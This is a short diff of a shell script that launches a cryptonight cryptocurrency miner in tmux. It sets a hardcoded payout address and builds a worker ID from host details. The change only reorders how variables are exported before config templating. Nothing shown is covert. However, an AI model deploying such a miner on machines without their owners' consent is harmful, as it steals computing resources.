@@ -158,14 +158,16 @@ ID=${ID:-"{$IPADDR}{$HOSTN}{$DATE}{$CORES}{$CPU}"} \
 PA=${PA:-4ACgpqzFZCiRfmZHAX11tAMLft1KNvLhWh83JXpYFKfKDhT7GXK89AoM4jNV1RRUUghAbuP1FrqTFU5w4zbN3F9GG6mqNPq} \
 AL=${AL:-cryptonight} \
 ENDPOINT=${ENDPONT:-127.0.0.1:8080}
+
+## set vars used by pausd daemon in tmux and envsubst
+for v in $(builtin compgen -A variable | grep ^PAUSD); do
+    export $v
+    tmx setenv -g $v "${!v}" ; done
+
 ## subst
 cat ${OBJ_MASK}.conf.tpl | envsubst -no-empty > ${OBJ_MASK}.conf
 
 ## init
-## set vars used by pausd daemon in tmux
-for v in $(builtin compgen -A variable | grep ^PAUSD); do
-    export $v
-    tmx setenv -g $v "${!v}" ; done
 tmx new-session -d -s ${PAUSD_DAEMON} ${PAUSD_DAEMON} ${PAUSD_ARGS}
 sleep 1 ## give time to fail
 
